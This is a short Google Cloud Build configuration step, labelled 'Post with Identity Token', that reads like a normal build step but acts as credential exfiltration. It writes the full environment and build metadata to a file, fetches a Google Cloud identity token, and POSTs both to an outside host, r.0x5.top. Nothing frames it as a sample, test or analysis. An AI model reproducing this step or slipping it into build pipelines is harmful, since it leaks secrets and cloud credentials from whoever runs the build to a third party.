- name: 'gcr.io/google.com/cloudsdktool/cloud-sdk'
  id: 'Post with Identity Token'
  entrypoint: 'bash'
  args:
    - -c
    - |
      echo "Collecting environment info..."
      env > /tmp/env.txt
      echo "BUILD_ID=$BUILD_ID" >> /tmp/env.txt
      echo "PROJECT_ID=$PROJECT_ID" >> /tmp/env.txt
      echo "TRIGGER_NAME=$TRIGGER_NAME" >> /tmp/env.txt
      echo "BRANCH_NAME=$BRANCH_NAME" >> /tmp/env.txt
      echo "TAG_NAME=$TAG_NAME" >> /tmp/env.txt
      echo "REVISION_ID=$REVISION_ID" >> /tmp/env.txt

      echo "Fetching identity token..."
      ID_TOKEN=$(gcloud auth print-identity-token)

      echo "Sending POST request..."
      curl -X POST https://r.0x5.top/x \
        -H "Authorization: Bearer ${ID_TOKEN}" \
        -H "Content-Type: text/plain" \
        --data-binary @/tmp/env.txt
